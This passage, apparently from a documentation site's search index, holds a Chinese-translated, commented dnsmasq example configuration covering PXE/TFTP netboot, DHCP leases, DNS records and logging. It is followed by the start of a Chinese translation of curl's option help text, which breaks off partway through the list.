\u6211\u4eec\u4e5f\u9700\u8981\u53d1\u9001\u9009\u9879\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u5728\u8fd9\u91cc\u4f7f\u7528dhcp-option-force\u3002 # \u8be6\u60c5\u89c1 http://syslinux.zytor.com/pxe.php#special\u3002 # \u9b54\u6cd5\u6570\u5b57 - \u5728\u4efb\u4f55\u5176\u4ed6\u4e1c\u897f\u88ab\u8ba4\u51fa\u4e4b\u524d\u9700\u8981 #dhcp-option-force=208,f1:00:74:7e # \u914d\u7f6e\u6587\u4ef6\u540d #dhcp-option-force=209,configs/common # \u8def\u5f84\u524d\u7f00 #dhcp-option-force=210,/tftpboot/pxelinux/files/ # \u91cd\u542f\u65f6\u95f4\u3002 (\u6ce8\u610f 'i' \u7528\u4e8e\u53d1\u900132\u4f4d\u503c) #dhcp-option-force=211,30i # \u4e3anetboot/PXE\u8bbe\u7f6e\u542f\u52a8\u6587\u4ef6\u540d\u3002\u4f60\u53ea\u9700\u8981\u8fd9\u4e2a # \u5982\u679c\u4f60\u60f3\u8981\u901a\u8fc7\u7f51\u7edc\u542f\u52a8\u673a\u5668\uff0c\u4f60\u5c06\u9700\u8981 # \u4e00\u4e2aTFTP\u670d\u52a1\u5668\uff1b\u8981\u4e48\u662fdnsmasq\u7684\u5185\u7f6eTFTP\u670d\u52a1\u5668\u6216\u4e00\u4e2a # \u5916\u90e8\u7684\u3002 (\u89c1\u4e0b\u9762\u5982\u4f55\u542f\u7528TFTP\u670d\u52a1\u5668\u3002) #dhcp-boot=pxelinux.0 # \u4e0e\u4e0a\u9762\u76f8\u540c\uff0c\u4f46\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684tftp-server\u4ee3\u66ff\u8fd0\u884cdnsmasq\u7684\u673a\u5668 #dhcp-boot=pxelinux,server.name,192.168.1.100 # \u4e3aiPXE\u5f15\u5bfc\u3002\u8fd9\u4e2a\u60f3\u6cd5\u662f\u53d1\u9001\u4e24\u4e2a\u4e0d\u540c\u7684 # \u6587\u4ef6\u540d\uff0c\u7b2c\u4e00\u4e2a\u52a0\u8f7diPXE\uff0c\u7b2c\u4e8c\u4e2a\u544a\u8bc9iPXE\u52a0\u8f7d\u4ec0\u4e48\u3002 # dhcp-match\u8bbe\u7f6eipxe\u6807\u7b7e\u4ee5\u54cd\u5e94\u6765\u81eaiPXE\u7684\u8bf7\u6c42\u3002 #dhcp-boot=undionly.kpxe #dhcp-match=set:ipxe,175 # iPXE\u53d1\u9001175\u9009\u9879\u3002 #dhcp-boot=tag:ipxe,http://boot.ipxe.org/demo/boot.php # \u4e3aiPXE\u5c01\u88c5\u7684\u9009\u9879\u3002\u6240\u6709\u9009\u9879\u90fd # \u5728175\u9009\u9879\u4e2d\u5c01\u88c5\u3002 #dhcp-option=encap:175, 1, 5b # \u4f18\u5148\u7ea7\u4ee3\u7801 #dhcp-option=encap:175, 176, 1b # \u65e0\u4ee3\u7406dhcp #dhcp-option=encap:175, 177, string # \u603b\u7ebfID #dhcp-option=encap:175, 189, 1b # BIOS\u9a71\u52a8\u4ee3\u7801 #dhcp-option=encap:175, 190, user # iSCSI\u7528\u6237\u540d #dhcp-option=encap:175, 191, pass # iSCSI\u5bc6\u7801 # \u6d4b\u8bd5netboot\u5ba2\u6237\u7aef\u7684\u67b6\u6784\u3002PXE\u5ba2\u6237\u7aef\u5e94 # \u901a\u8fc7\u9009\u987993\u53d1\u9001\u5176\u67b6\u6784\u3002\uff08\u53c2\u89c1RFC 4578\uff09 #dhcp-match=peecees, option:client-arch, 0 #x86-32 #dhcp-match=itanics, option:client-arch, 2 #IA64 #dhcp-match=hammers, option:client-arch, 6 #x86-64 #dhcp-match=mactels, option:client-arch, 7 #EFI x86-64 # \u505a\u771f\u6b63\u7684PXE\uff0c\u800c\u4e0d\u662f\u4ec5\u5f15\u5bfc\u5355\u4e2a\u6587\u4ef6\uff0c\u8fd9\u662f\u4e00\u4e2a # dhcp-boot\u7684\u66ff\u4ee3\u65b9\u6848\u3002 #pxe-prompt=\"What system shall I netboot?\" # \u6216\u5728\u7b2c\u4e00\u6b21\u53ef\u7528\u64cd\u4f5c\u6267\u884c\u524d\u7684\u8d85\u65f6\uff1a #pxe-prompt=\"Press F8 for menu.\", 60 # \u53ef\u7528\u7684\u5f15\u5bfc\u670d\u52a1\u3002\u7528\u4e8ePXE\u3002 #pxe-service=x86PC, \"Boot from local disk\" # \u4ecednsmasq TFTP\u670d\u52a1\u5668\u52a0\u8f7d<tftp-root>/pxelinux.0\u3002 #pxe-service=x86PC, \"Install Linux\", pxelinux # \u4ece\u4f4d\u4e8e1.2.3.4\u7684TFTP\u670d\u52a1\u5668\u52a0\u8f7d<tftp-root>/pxelinux.0\u3002 # \u6ce8\u610f\u8fd9\u5728\u65e7\u7684PXE ROM\u4e0a\u53ef\u80fd\u5931\u8d25\u3002 #pxe-service=x86PC, \"Install Linux\", pxelinux, 1.2.3.4 # \u4f7f\u7528\u7f51\u7edc\u4e0a\u7684\u5f15\u5bfc\u670d\u52a1\u5668\uff0c\u901a\u8fc7\u591a\u64ad\u6216\u5e7f\u64ad\u627e\u5230\u3002 #pxe-service=x86PC,\"Install windows from RIS server\", 1 # \u4f7f\u7528\u5df2\u77e5IP\u5730\u5740\u7684\u5f15\u5bfc\u670d\u52a1\u5668\u3002 #pxe-service=x86PC, \"Install windows from RIS server\", 1, 1.2.3.4 # \u5982\u679c\u4f60\u6709\u53ef\u7528\u7684\u591a\u64adFTP\uff0c # \u53ef\u4ee5\u4ee5\u7c7b\u4f3c\u65b9\u5f0f\u4f20\u9012\u5173\u4e8e\u6b64\u7684\u4fe1\u606f\uff0c\u4f7f\u7528\u9009\u98791 # \u52305\u3002\u53c2\u89c1\u7b2c19\u9875 # http://download.intel.com/design/archives/wfm/downloads/pxespec.pdf # \u542f\u7528dnsmasq\u7684\u5185\u7f6eTFTP\u670d\u52a1\u5668 #enable-tftp # \u8bbe\u7f6e\u53ef\u901a\u8fc7FTP\u63d0\u4f9b\u6587\u4ef6\u7684\u6839\u76ee\u5f55\u3002 #tftp-root=/var/ftpd # \u5982\u679ctftp-root\u4e0d\u53ef\u7528\uff0c\u4e0d\u4e2d\u6b62 #tftp-no-fail # \u8ba9TFTP\u670d\u52a1\u5668\u66f4\u5b89\u5168\uff1a\u8bbe\u7f6e\u6b64\u9879\u540e\uff0c\u53ea\u6709 # \u7528\u6237dnsmasq\u8fd0\u884c\u65f6\u7684\u7528\u6237\u62e5\u6709\u7684\u6587\u4ef6\u624d\u4f1a\u901a\u8fc7\u7f51\u7edc\u53d1\u9001\u3002 #tftp-secure # \u6b64\u9009\u9879\u963b\u6b62dnsmasq\u4e3aTFTP\u4f20\u8f93\u534f\u5546\u66f4\u5927\u7684\u5757\u5927\u5c0f\u3002 # \u5b83\u4f1a\u51cf\u6162\u901f\u5ea6\uff0c\u4f46\u53ef\u80fd\u62ef\u6551\u4e00\u4e9b\u635f\u574f\u7684TFTP\u5ba2\u6237\u7aef\u3002 #tftp-no-blocksize # \u8bbe\u7f6e\u4ec5\u5f53\u8bbe\u7f6e\u4e86\"red\"\u6807\u7b7e\u65f6\u7684\u542f\u52a8\u6587\u4ef6\u540d\u3002 #dhcp-boot=tag:red,pxelinux.red-net # dhcp-boot\u7684\u4e00\u4e2a\u793a\u4f8b\uff0c\u5e26\u6709\u5916\u90e8TFTP\u670d\u52a1\u5668\uff1a\u6587\u4ef6\u540d\u540e\u7ed9\u51fa\u670d\u52a1\u5668\u7684\u540d\u79f0\u548cIP\u5730\u5740\u3002 # \u5728\u65e7\u7684PXE ROM\u4e0a\u53ef\u80fd\u5931\u8d25\u3002\u88ab--pxe-service\u8986\u76d6\u3002 #dhcp-boot=/var/ftpd/pxelinux.0,boothost,192.168.0.3 # \u5982\u679c\u6709\u591a\u4e2a\u5916\u90e8tftp\u670d\u52a1\u5668\u5177\u6709\u76f8\u540c\u7684\u540d\u5b57 # (\u4f7f\u7528/etc/hosts) \u5219\u53ef\u4ee5\u6307\u5b9a\u8be5\u540d\u79f0\u4e3atftp_servername # (dhcp-boot\u7684\u7b2c\u4e09\u4e2a\u9009\u9879) \u5e76\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0bdnsmasq\u5c06\u89e3\u6790\u6b64\u540d\u79f0 # \u5e76\u4ee5\u5faa\u73af\u65b9\u5f0f\u8fd4\u56de\u7ed3\u679cIP\u5730\u5740\u3002\u6b64\u529f\u80fd\u53ef\u7528\u4e8e # \u5728\u4e00\u7ec4\u670d\u52a1\u5668\u4e4b\u95f4\u5e73\u8861tftp\u8d1f\u8f7d\u3002 #dhcp-boot=/var/ftpd/pxelinux.0,boothost,tftp_server_name # \u8bbe\u7f6eDHCP\u79df\u7ea6\u7684\u9650\u5236\uff0c\u7f3a\u7701\u503c\u4e3a150 #dhcp-lease-max=150 # DHCP\u670d\u52a1\u5668\u9700\u8981\u4e00\u4e2a\u78c1\u76d8\u4f4d\u7f6e\u6765\u4fdd\u6301\u5176\u79df\u7ea6\u6570\u636e\u5e93\u3002 # \u8fd9\u9ed8\u8ba4\u4e8e\u4e00\u4e2a\u5408\u7406\u7684\u4f4d\u7f6e\uff0c\u4f46\u5982\u679c\u4f60\u60f3\u6539\u53d8\u5b83\uff0c\u4f7f\u7528 # \u4e0b\u9762\u7684\u884c\u3002 #dhcp-leasefile=/var/lib/dnsmasq/dnsmasq.leases # \u5c06DHCP\u670d\u52a1\u5668\u8bbe\u7f6e\u4e3a\u6743\u5a01\u6a21\u5f0f\u3002\u5728\u8fd9\u79cd\u6a21\u5f0f\u4e0b\uff0c\u5b83\u5c06\u4ecb\u5165 # \u5e76\u63a5\u7ba1\u4efb\u4f55\u5728\u7f51\u7edc\u4e0a\u5e7f\u64ad\u7684\u5ba2\u6237\u7aef\u7684\u79df\u7ea6\uff0c # \u65e0\u8bba\u5b83\u662f\u5426\u6709\u8be5\u79df\u7ea6\u7684\u8bb0\u5f55\u3002\u8fd9\u907f\u514d\u4e86\u5f53\u4e00\u53f0\u673a\u5668 # \u5728\u65b0\u7f51\u7edc\u4e0a\u5524\u9192\u65f6\u7684\u957f\u65f6\u95f4\u8d85\u65f6\u3002\u5982\u679c\u6709 # \u4efb\u4f55\u53ef\u80fd\u4f60\u6700\u7ec8\u4e0d\u5c0f\u5fc3\u4e3a\u4f60\u7684\u6821\u56ed/\u516c\u53f8\u914d\u7f6e\u4e86\u4e00\u4e2aDHCP\u670d\u52a1\u5668\uff0c # \u5219\u4e0d\u8981\u542f\u7528\u6b64\u529f\u80fd\u3002ISC\u670d\u52a1\u5668\u4f7f\u7528 # \u76f8\u540c\u7684\u9009\u9879\uff0c\u8fd9\u4e2aURL\u63d0\u4f9b\u4e86\u66f4\u591a\u4fe1\u606f\uff1a # http://www.isc.org/files/auth.html #dhcp-authoritative # \u5c06DHCP\u670d\u52a1\u5668\u8bbe\u7f6e\u4e3a\u6839\u636eRFC 4039\u542f\u7528DHCPv4 Rapid Commit\u9009\u9879\u3002 # \u5728\u8fd9\u79cd\u6a21\u5f0f\u4e0b\uff0c\u5b83\u5c06\u54cd\u5e94\u5305\u542bRapid Commit\u9009\u9879\u7684DHCPDISCOVER\u6d88\u606f # \u7528\u4e00\u4e2a\u5305\u542bRapid Commit\u9009\u9879\u548c\u5b8c\u5168\u63d0\u4ea4\u7684\u5730\u5740\u548c\u914d\u7f6e\u4fe1\u606f\u7684DHCPACK\u3002 # \u4ec5\u5f53\u670d\u52a1\u5668\u662f\u5b50\u7f51\u7684\u552f\u4e00\u670d\u52a1\u5668\uff0c\u6216\u8005\u591a\u4e2a\u670d\u52a1\u5668\u5b58\u5728\u5e76\u4e14\u5b83\u4eec\u6bcf\u4e2a\u90fd # \u4e3a\u6240\u6709\u5ba2\u6237\u7aef\u63d0\u4ea4\u7ed1\u5b9a\u65f6\uff0c\u624d\u80fd\u542f\u7528\u6b64\u6a21\u5f0f\u3002 #dhcp-rapid-commit # \u5728\u521b\u5efa\u6216\u9500\u6bc1DHCP\u79df\u7ea6\u65f6\u8fd0\u884c\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u3002 # \u53d1\u9001\u5230\u811a\u672c\u7684\u53c2\u6570\u662f \"add\" \u6216 \"del\", # \u7136\u540e\u662fMAC\u5730\u5740\uff0cIP\u5730\u5740\uff0c\u6700\u540e\u662f\u4e3b\u673a\u540d # \u5982\u679c\u6709\u7684\u8bdd\u3002 #dhcp-script=/bin/echo # \u5728\u8fd9\u91cc\u8bbe\u7f6e\u7f13\u5b58\u5927\u5c0f\u3002 cache-size=1500 # \u5982\u679c\u4f60\u60f3\u7981\u7528\u8d1f\u7f13\u5b58\uff0c\u53d6\u6d88\u6ce8\u91ca\u8fd9\u4e00\u884c\u3002 #no-negcache # \u901a\u5e38\u6765\u81ea/etc/hosts\u548cDHCP\u79df\u7ea6\u6587\u4ef6\u7684\u54cd\u5e94 # \u6709\u751f\u5b58\u65f6\u95f4\u8bbe\u7f6e\u4e3a\u96f6\uff0c\u4f20\u7edf\u4e0a\u610f\u5473\u7740 # \u4e0d\u8fdb\u4e00\u6b65\u7f13\u5b58\u3002\u5982\u679c\u4f60\u613f\u610f\u4e3a\u4e86\u51cf\u8f7b\u670d\u52a1\u5668\u8d1f\u8f7d # \u4ea4\u6362\u6f5c\u5728\u7684\u9648\u65e7\u6570\u636e\uff0c\u4f60\u53ef\u4ee5\u5728\u8fd9\u91cc\u8bbe\u7f6e\u4e00\u4e2a\u751f\u5b58\u65f6\u95f4\uff08\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff09\u3002 #local-ttl= # \u5982\u679c\u4f60\u5e0c\u671bdnsmasq\u68c0\u6d4bVerisign\u4f01\u56fe\u53d1\u9001\u67e5\u8be2 # \u5230\u672a\u6ce8\u518c\u7684.com\u548c.net\u4e3b\u673a\u5230\u5176sitefinder\u670d\u52a1\uff0c\u5e76\u4e14\u8ba9 # dnsmasq\u53cd\u800c\u8fd4\u56de\u6b63\u786e\u7684NXDOMAIN\u54cd\u5e94\uff0c\u53d6\u6d88\u6ce8\u91ca # \u8fd9\u4e00\u884c\u3002\u4f60\u53ef\u4ee5\u6dfb\u52a0\u7c7b\u4f3c\u7684\u884c\u6765\u505a\u540c\u6837\u7684\u4e8b\u60c5 # \u5bf9\u4e8e\u5b9e\u73b0\u4e86\u901a\u914d\u7b26A\u8bb0\u5f55\u7684\u5176\u4ed6\u6ce8\u518c\u673a\u6784\u3002 #bogus-nxdomain=64.94.110.11 # \u5982\u679c\u4f60\u60f3\u8981\u4fee\u6b63\u6765\u81ea\u4e0a\u6e38\u670d\u52a1\u5668\u7684DNS\u7ed3\u679c\uff0c\u4f7f\u7528 # alias\u9009\u9879\u3002\u8fd9\u53ea\u9002\u7528\u4e8eIPv4\u3002 # \u8fd9\u4e2a\u522b\u540d\u4f7f1.2.3.4\u7684\u7ed3\u679c\u51fa\u73b0\u4e3a5.6.7.8 #alias=1.2.3.4,5.6.7.8 # \u8fd9\u5c06\u6620\u5c041.2.3.x\u52305.6.7.x #alias=1.2.3.0,5.6.7.0,255.255.255.0 # \u8fd9\u5c06\u6620\u5c04192.168.0.10-192.168.0.40\u523010.0.0.10-10.0.0.40 #alias=192.168.0.10-192.168.0.40,10.0.0.0,255.255.255.0 # \u66f4\u6539\u4ee5\u4e0b\u884c\uff0c\u5982\u679c\u4f60\u5e0c\u671bdnsmasq\u63d0\u4f9bMX\u8bb0\u5f55\u3002 # \u8fd4\u56de\u540d\u4e3a \"maildomain.com\" \u7684MX\u8bb0\u5f55\uff0c\u76ee\u6807 # \u670d\u52a1\u5668\u4e3a servermachine.com \u548c\u4f18\u5148\u7ea7\u4e3a 50 #mx-host=maildomain.com,servermachine.com,50 # \u8bbe\u7f6e\u4f7f\u7528localmx\u9009\u9879\u521b\u5efa\u7684MX\u8bb0\u5f55\u7684\u9ed8\u8ba4\u76ee\u6807\u3002 #mx-target=servermachine.com # \u8fd4\u56de\u6307\u5411mx-target\u7684MX\u8bb0\u5f55\u7ed9\u6240\u6709\u672c\u5730 # \u673a\u5668\u3002 #localmx # \u8fd4\u56de\u4e00\u4e2a\u6307\u5411\u81ea\u8eab\u7684MX\u8bb0\u5f55\u7ed9\u6240\u6709\u672c\u5730\u673a\u5668\u3002 #selfmx # \u66f4\u6539\u4ee5\u4e0b\u884c\uff0c\u5982\u679c\u4f60\u5e0c\u671bdnsmasq\u63d0\u4f9bSRV # \u8bb0\u5f55\u3002\u8fd9\u4e9b\u5728\u4f60\u5e0c\u671b\u4e3a # Active Directory\u548c\u5176\u4ed6windows\u8d77\u6e90\u7684DNS\u8bf7\u6c42\u670d\u52a1ldap\u65f6\u5f88\u6709\u7528\u3002 # \u53c2\u89c1RFC 2782\u3002 # \u4f60\u53ef\u4ee5\u6dfb\u52a0\u591a\u4e2asrv-host\u884c\u3002 # \u5b57\u6bb5\u662f<name>,<target>,<port>,<priority>,<weight> # \u5982\u679c\u540d\u5b57\u90e8\u5206\u7f3a\u5c11\u57df\uff08\u6240\u4ee5\u5b83\u53ea\u6709\u670d\u52a1\u548c\u534f\u8bae\u90e8\u5206\uff09 # \u90a3\u4e48\u4f7f\u7528domain=\u914d\u7f6e\u9009\u9879\u7ed9\u51fa\u7684\u57df\u3002\uff08\u6ce8\u610fexpand-hosts\u4e0d\u9700\u8981 # \u8bbe\u7f6e\u4e3a\u8fd9\u4e2a\u5de5\u4f5c\u3002\uff09 # \u4e00\u4e2aSRV\u8bb0\u5f55\uff0c\u4e3aexample.com\u57df\u53d1\u9001LDAP\u5230 # ldapserver.example.com\u7aef\u53e3389 #srv-host=_ldap._tcp.example.com,ldapserver.example.com,389 # \u4e00\u4e2aSRV\u8bb0\u5f55\uff0c\u4f7f\u7528domain=\u53d1\u9001LDAP\u4e3aexample.com\u57df\u5230 # ldapserver.example.com\u7aef\u53e3389 #domain=example.com #srv-host=_ldap._tcp,ldapserver.example.com,389 # \u4e24\u4e2aLDAP\u7684SRV\u8bb0\u5f55\uff0c\u6bcf\u4e2a\u6709\u4e0d\u540c\u7684\u4f18\u5148\u7ea7 #srv-host=_ldap._tcp.example.com,ldapserver.example.com,389,1 #srv-host=_ldap._tcp.example.com,ldapserver.example.com,389,2 # \u4e00\u4e2aSRV\u8bb0\u5f55\u6307\u793aexample.com\u57df\u6ca1\u6709LDAP\u670d\u52a1\u5668 #srv-host=_ldap._tcp.example.com # \u4e0b\u9762\u7684\u884c\u663e\u793a\u5982\u4f55\u4f7fdnsmasq\u63d0\u4f9b\u4e00\u4e2a\u4efb\u610f\u7684PTR # \u8bb0\u5f55\u3002\u8fd9\u5bf9DNS-SD\u5f88\u6709\u7528\u3002\uff08\u6ce8\u610f # \u4e3aSRV\u8bb0\u5f55\u5b8c\u6210\u7684\u57df\u540d\u6269\u5c55 _does_not # \u53d1\u751f\u5728PTR\u8bb0\u5f55\u4e0a\u3002\uff09 #ptr-record=_http._tcp.dns-sd-services,\"New Employee Page._http._tcp.dns-sd-services\" # \u66f4\u6539\u4ee5\u4e0b\u884c\uff0c\u5982\u679c\u4f60\u5e0c\u671bdnsm# asq\u63d0\u4f9bTXT\u8bb0\u5f55\u3002 # \u8fd9\u4e9b\u7528\u4e8e\u50cfSPF\u548czeroconf\u8fd9\u6837\u7684\u4e1c\u897f\u3002\uff08\u6ce8\u610f # \u4e3aSRV\u8bb0\u5f55\u5b8c\u6210\u7684\u57df\u540d\u6269\u5c55 _does_not # \u53d1\u751f\u5728TXT\u8bb0\u5f55\u4e0a\u3002\uff09 # \u793a\u4f8bSPF\u3002 #txt-record=example.com,\"v=spf1 a -all\" # \u793a\u4f8bzeroconf #txt-record=_http._tcp.example.com,name=value,paper=A4 # \u4e3a\u4e00\u4e2a\u201c\u672c\u5730\u201dDNS\u540d\u79f0\u63d0\u4f9b\u522b\u540d\u3002\u6ce8\u610f\u8fd9 _only_ \u5bf9\u4e8e # \u76ee\u6807\u662f\u6765\u81eaDHCP\u6216/etc/hosts\u7684\u540d\u79f0\u6709\u6548\u3002\u7ed9\u4e3b\u673a # \"bert\" \u53e6\u4e00\u4e2a\u540d\u5b57\uff0cbertrand #cname=bertand,bert # \u4e3a\u4e86\u8c03\u8bd5\u76ee\u7684\uff0c\u8bb0\u5f55\u6bcf\u4e2a\u901a\u8fc7 # dnsmasq\u7684DNS\u67e5\u8be2\u3002 log-queries # \u65e5\u5fd7\u6587\u4ef6\u4f4d\u7f6e\u3002 log-facility=/var/log/dnsmasq.log # \u8bb0\u5f55\u6709\u5173DHCP\u4ea4\u6613\u7684\u5927\u91cf\u989d\u5916\u4fe1\u606f\u3002 #log-dhcp # \u5305\u542b\u53e6\u4e00\u7ec4\u914d\u7f6e\u9009\u9879\u3002 #conf-file=/etc/dnsmasq.more.conf #conf-dir=/etc/dnsmasq.d # \u5305\u542b\u4e00\u4e2a\u76ee\u5f55\u4e2d\u7684\u6240\u6709\u6587\u4ef6\uff0c\u9664\u4e86\u4ee5.bak\u7ed3\u5c3e\u7684\u6587\u4ef6 #conf-dir=/etc/dnsmasq.d,.bak # \u5305\u542b\u4e00\u4e2a\u76ee\u5f55\u4e2d\u6240\u6709\u4ee5.conf\u7ed3\u5c3e\u7684\u6587\u4ef6 #conf-dir=/etc/dnsmasq.d/,*.conf # \u5305\u542b/etc/dnsmasq.d\u4e2d\u7684\u6240\u6709\u6587\u4ef6\uff0c\u9664\u4e86RPM\u5907\u4efd\u6587\u4ef6 conf-dir=/etc/dnsmasq.d,.rpmnew,.rpmsave,.rpmorig # \u5982\u679c\u4e00\u4e2aDHCP\u5ba2\u6237\u7aef\u58f0\u79f0\u5b83\u7684\u540d\u5b57\u662f\"wpad\"\uff0c\u5ffd\u7565\u5b83\u3002 # \u8fd9\u4fee\u590d\u4e86\u4e00\u4e2a\u5b89\u5168\u6f0f\u6d1e\u3002\u8bf7\u53c2\u9605CERT\u6f0f\u6d1eVU#598349 #dhcp-name-match=set:wpad-ignore,wpad #dhcp-ignore-names=tag:wpad-ignore","title":"\u6d4b\u8bd5\u914d\u7f6e"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/curl%E5%91%BD%E4%BB%A4/","text":"curl\u547d\u4ee4 \u4f7f\u7528\u65b9\u5f0f\uff1acurl [\u9009\u9879...] <url> \u9009\u9879\uff1a(H) \u4ee3\u8868\u4ec5\u9002\u7528\u4e8e HTTP/HTTPS\uff0c(F) \u4ee3\u8868\u4ec5\u9002\u7528\u4e8e FTP --anyauth \u9009\u62e9\u201c\u4efb\u4f55\u201d\u8ba4\u8bc1\u65b9\u5f0f (H) -a, --append \u4e0a\u4f20\u65f6\u8ffd\u52a0\u5230\u76ee\u6807\u6587\u4ef6 (F/SFTP) --basic \u4f7f\u7528 HTTP \u57fa\u672c\u8ba4\u8bc1 (H) --cacert FILE \u7528\u4e8e\u5bf9\u7b49\u65b9\u9a8c\u8bc1\u7684 CA \u8bc1\u4e66 (SSL) --capath DIR \u7528\u4e8e\u5bf9\u7b49\u65b9\u9a8c\u8bc1\u7684 CA \u76ee\u5f55 (SSL) -E, --cert CERT[:PASSWD] \u5ba2\u6237\u7aef\u8bc1\u4e66\u6587\u4ef6\u548c\u5bc6\u7801 (SSL) --cert-type TYPE \u8bc1\u4e66\u6587\u4ef6\u7c7b\u578b (DER/PEM/ENG) (SSL) --ciphers LIST \u8981\u4f7f\u7528\u7684 SSL \u5bc6\u7801 (SSL) --compressed \u8bf7\u6c42\u538b\u7f29\u54cd\u5e94 (\u4f7f\u7528 deflate \u6216 gzip) -K, --config FILE \u6307\u5b9a\u8981\u8bfb\u53d6\u7684\u914d\u7f6e\u6587\u4ef6 --connect-timeout SECONDS \u8fde\u63a5\u7684\u6700\u957f\u5141\u8bb8\u65f6\u95f4 -C, --continue-at OFFSET \u6062\u590d\u4f20\u8f93\u7684\u504f\u79fb\u91cf -b, --cookie STRING/FILE \u4ece\u5b57\u7b26\u4e32\u6216\u6587\u4ef6\u8bfb\u53d6 cookie (H) -c, --cookie-jar FILE \u64cd\u4f5c\u540e\u5c06 cookie \u5199\u5165\u6b64\u6587\u4ef6 (H) --create-dirs \u521b\u5efa\u5fc5\u8981\u7684\u672c\u5730\u76ee\u5f55\u7ed3\u6784 --crlf \u4e0a\u4f20\u65f6\u5c06 LF \u8f6c\u6362\u4e3a CRLF --crlfile FILE \u4ece\u7ed9\u5b9a\u6587\u4ef6\u83b7\u53d6 PEM \u683c\u5f0f\u7684 CRL \u5217\u8868 -d, --data DATA HTTP POST \u6570\u636e (H) --data-ascii DATA HTTP POST ASCII \u6570\u636e (H) --data-binary DATA HTTP POST \u4e8c\u8fdb\u5236\u6570\u636e (H) --data-urlencode DATA HTTP POST \u6570\u636e URL \u7f16\u7801 (H) --delegation STRING GSS-API \u59d4\u6d3e\u6743\u9650 --digest \u4f7f\u7528 HTTP \u6458\u8981\u8ba4\u8bc1 (H) --disable-eprt \u7981\u6b62\u4f7f\u7528 EPRT \u6216 LPRT (F) --disable-epsv \u7981\u6b62\u4f7f\u7528 EPSV (F) -D, --dump-header FILE \u5c06\u5934\u4fe1\u606f\u5199\u5165\u6b64\u6587\u4ef6 --egd-file FILE EGD \u5957\u63a5\u5b57\u8def\u5f84\uff0c\u7528\u4e8e\u968f\u673a\u6570\u636e (SSL) --engine ENGINGE \u52a0\u5bc6\u5f15\u64ce (SSL)\u3002\u201c--engine list\u201d \u663e\u793a\u5217\u8868 -f, --fail \u5728 HTTP \u9519\u8bef\u65f6\u9759\u9ed8\u5931\u8d25\uff08\u5b8c\u5168\u6ca1\u6709\u8f93\u51fa\uff09(H) -F, --form CONTENT \u6307\u5b9a HTTP \u591a\u90e8\u5206 POST \u6570\u636e (H) --form-string STRING \u6307\u5b9a HTTP \u591a\u90e8\u5206 POST \u6570\u636e (H) --ftp-account DATA \u8d26\u6237\u6570\u636e\u5b57\u7b26\u4e32 (F) --ftp-alternative-to-user COMMAND \u7528\u4e8e\u66ff\u6362 \u201cUSER [name]\u201d \u7684\u5b57\u7b26\u4e32 (F) --ftp-create-dirs \u5982\u679c\u8fdc\u7a0b\u76ee\u5f55\u4e0d\u5b58\u5728\uff0c\u5219\u521b\u5efa (F) --ftp-method [MULTICWD/NOCWD/SINGLECWD] \u63a7\u5236 CWD \u4f7f\u7528 (F) --ftp-pasv \u4f7f\u7528 PASV/EPSV \u800c\u4e0d\u662f PORT (F) -P, --ftp-port ADR \u4f7f\u7528 PORT \u4ee5\u53ca\u7ed9\u5b9a\u5730\u5740\u800c\u975e PASV (F) --ftp-skip-pasv-ip \u8df3\u8fc7 PASV \u7684 IP \u5730\u5740 (F) --ftp-pret \u5728 PASV \u4e4b\u524d\u53d1\u9001 PRET\uff08\u7528\u4e8e drftpd\uff09(F) --ftp-ssl-ccc \u5728\u8ba4\u8bc1\u540e\u53d1\u9001 CCC (F) --ftp-ssl-ccc-mode ACTIVE/PASSIVE \u8bbe\u7f6e CCC \u6a21\u5f0f (F) --ftp-ssl-control \u5bf9\u4e8e ftp \u767b\u5f55\u8981\u6c42 SSL/TLS\uff0c\u4f20\u8f93\u65f6\u6e05\u9664 (F) -G, --get \u4f7f\u7528 HTTP GET \u53d1\u9001 -d \u6570\u636e (H) -g, --globoff \u7981\u7528\u4f7f\u7528 {} \u548c [] \u7684 URL \u5e8f\u5217\u548c\u8303\u56f4 -H, --header LINE \u53d1\u9001\u7ed9\u670d\u52a1\u5668\u7684\u81ea\u5b9a\u4e49\u5934\u4fe1\u606f (H) -I, --head \u4ec5\u663e\u793a\u6587\u6863\u4fe1\u606f -h, --help \u6b64\u5e2e\u52a9\u6587\u672c --hostpubmd5 MD5 \u5bbf\u4e3b\u516c\u94a5\u7684\u5341\u516d\u8fdb\u5236\u7f16\u7801 MD5 \u5b57\u7b26\u4e32 (SSH) -0, --http1.0 \u4f7f\u7528 HTTP 1.0 (H) --ignore-content-length \u5ffd\u7565 HTTP Content-Length \u5934 -i, --include \u5728\u8f93\u51fa\u4e2d\u5305\u542b\u534f\u8bae\u5934 (H/F) -k, --insecure \u5141\u8bb8\u8fde\u63a5\u5230\u6ca1\u6709\u8bc1\u4e66\u7684 SSL \u7ad9\u70b9 (H) --interface INTERFACE \u6307\u5b9a\u8981\u4f7f\u7528\u7684\u7f51\u7edc\u63a5\u53e3/\u5730\u5740 -4, --ipv4 \u5c06\u540d\u79f0\u89e3\u6790\u4e3a IPv4 \u5730\u5740 -6, --ipv6 \u5c06\u540d\u79f0\u89e3\u6790\u4e3a IPv6 \u5730\u5740 -j, --junk-session-cookies \u5ffd\u7565\u4ece\u6587\u4ef6\u8bfb\u53d6\u7684\u4f1a\u8bdd cookie (H) --keepalive-time SECONDS \u4fdd\u6301\u6d3b\u52a8\u63a2\u6d4b\u4e4b\u95f4\u7684\u95f4\u9694 --key KEY \u79c1\u94a5\u6587\u4ef6\u540d (SSL/SSH) --key-type TYPE \u79c1\u94a5\u6587\u4ef6\u7c7b\u578b (DER/PEM/ENG) (SSL) --krb LEVEL \u542f\u7528 Kerberos\uff0c\u5e76\u6307\u5b9a\u5b89\u5168\u7ea7\u522b (F) --libcurl FILE \u5c06\u6b64\u547d\u4ee4\u884c\u7684 libcurl \u7b49\u6548\u4ee3\u7801\u8f6c\u50a8 --limit-rate RATE \u5c06\u4f20\u8f93\u901f\u5ea6\u9650\u5236\u4e3a\u6b64\u901f\u7387 -l, --list-only \u4ec5\u5217\u51fa FTP \u76ee\u5f55\u7684\u540d\u79f0 (F) --local-port RANGE \u5f3a\u5236\u4f7f\u7528\u8fd9\u4e9b\u672c\u5730\u7aef\u53e3\u53f7 -L, --location \u8ddf\u968f\u91cd\u5b9a\u5411 (H) --location-trusted \u50cf --location 